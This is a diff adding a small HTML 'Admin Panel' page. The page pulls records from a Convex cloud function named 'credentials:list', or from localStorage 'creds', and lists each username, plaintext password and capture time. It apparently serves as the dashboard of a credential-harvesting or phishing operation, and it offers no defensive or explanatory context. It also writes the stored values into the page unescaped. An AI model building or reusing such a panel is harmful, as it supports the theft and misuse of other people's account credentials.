@@ -1,0 +1,8 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Admin</title>
+<script src="https://cdn.jsdelivr.net/npm/convex@1.16.5/dist/browser/umd/convex.js"></script>
+<style>body{background:#0f172a;color:#fff;font-family:system-ui;padding:20px}.c{background:#1e293b;padding:15px;margin:10px 0;border-radius:8px;border:1px solid #334155}.u{font-size:18px;font-weight:bold}.p{font-family:monospace;background:#000;padding:8px;margin:8px 0;border-radius:4px}.t{font-size:12px;color:#666}</style>
+</head><body><h1>Admin Panel</h1><button onclick="load()">Carica</button><div id="x"></div>
+<script>const C='https://dynamic-stoat-328.convex.cloud';let c=null;
+async function load(){try{c=new Convex.ConvexHttpClient(C);const d=await c.query('credentials:list',{});render(d);}catch(e){const d=JSON.parse(localStorage.getItem('creds')||'[]');render(d.map((x,i)=>({...x,_id:i})));}
+function render(d){document.getElementById('x').innerHTML=d.map(x=>'<div class="c"><div class="u">'+(x.u||x.username)+'</div><div class="p">'+(x.p||x.password)+'</div><div class="t">'+new Date(x.t||x.timestamp).toLocaleString()+'</div></div>').join('');}
+load();</script></body></html>
